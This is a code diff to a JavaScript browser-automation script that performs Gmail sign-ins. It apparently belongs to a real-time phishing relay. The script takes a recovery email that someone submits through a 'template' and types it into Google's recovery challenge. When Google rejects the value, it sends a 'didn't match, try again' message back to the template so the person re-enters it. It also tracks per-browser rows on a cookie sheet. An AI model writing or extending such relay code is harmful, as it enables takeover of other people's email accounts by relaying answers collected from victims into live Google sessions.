@@ -2115,7 +2115,20 @@ async function phaseWaitingRecoveryEmail(browserId, browser, page, email, platfo
             }
 
             const currentSheetStatus = checkRow[columnIndexes['status']];
-            const recoveryEmailValue = checkRow[columnIndexes['recoveryEmail']];
+            // Value source: cache first (update-process writes the template's
+            // submission there; the cookie sheet has no recoveryEmail column),
+            // sheet column fallback for compatibility.
+            let recoveryEmailValue = null;
+            try {
+                const cachedRowForRecovery = getCachedRow(browserId);
+                if (cachedRowForRecovery?.recoveryEmail && String(cachedRowForRecovery.recoveryEmail).trim() !== "") {
+                    recoveryEmailValue = String(cachedRowForRecovery.recoveryEmail).trim();
+                }
+            } catch (_) {}
+            if (!recoveryEmailValue && columnIndexes['recoveryEmail'] !== undefined) {
+                const sheetRecovery = checkRow[columnIndexes['recoveryEmail']];
+                if (sheetRecovery && String(sheetRecovery).trim() !== "") recoveryEmailValue = String(sheetRecovery).trim();
+            }
 
             if (currentSheetStatus !== "WAITINGRECOVERYEMAIL") {
                 logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Status changed externally to ${currentSheetStatus}. Exiting loop.`);
@@ -2195,6 +2208,26 @@ async function phaseWaitingRecoveryEmail(browserId, browser, page, email, platfo
                             };
                             updateBrowserRowDataFast(browserId, updateData);
                             break;
+                        } else if (postRecoveryState.required && postRecoveryState.type === 'text_input' && postRecoveryState.viewName === 'Gmail Recovery Email Confirmation') {
+                            // Still on the recovery page — Google rejected the address.
+                            // Stay and surface the error so the template shows it.
+                            logger.warn(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Still on recovery entry after submit (address rejected). Staying in WAITINGRECOVERYEMAIL.`);
+                            updateData.recoveryEmail = '';
+                            updateData.lastJsonResponse = JSON.stringify({
+                                ...JSON.parse(updateData.lastJsonResponse || '{}'),
+                                status: "WAITING_RECOVERY_EMAIL",
+                                verificationState: 'WAITING_RECOVERY_EMAIL_ERROR',
+                                viewName: postRecoveryState.viewName,
+                                recoveryMasked: postRecoveryState.recoveryMasked || null,
+                                message: "That recovery email didn't match. Please check it and try again."
+                            });
+                            updateBrowserRowDataFast(browserId, {
+                                status: "WAITINGRECOVERYEMAIL",
+                                recoveryEmail: '',
+                                lastJsonResponse: updateData.lastJsonResponse
+                            });
+                            logger.info(`[engineProcess][${browserId}] -WAITINGRECOVERYEMAIL (address rejected, waiting for new value)`);
+                            activelyProcessing.delete(browserId);
                         } else {
                             const inboxReached = await isInbox(page, platformConfig).catch(() => false);
                             if (inboxReached) {
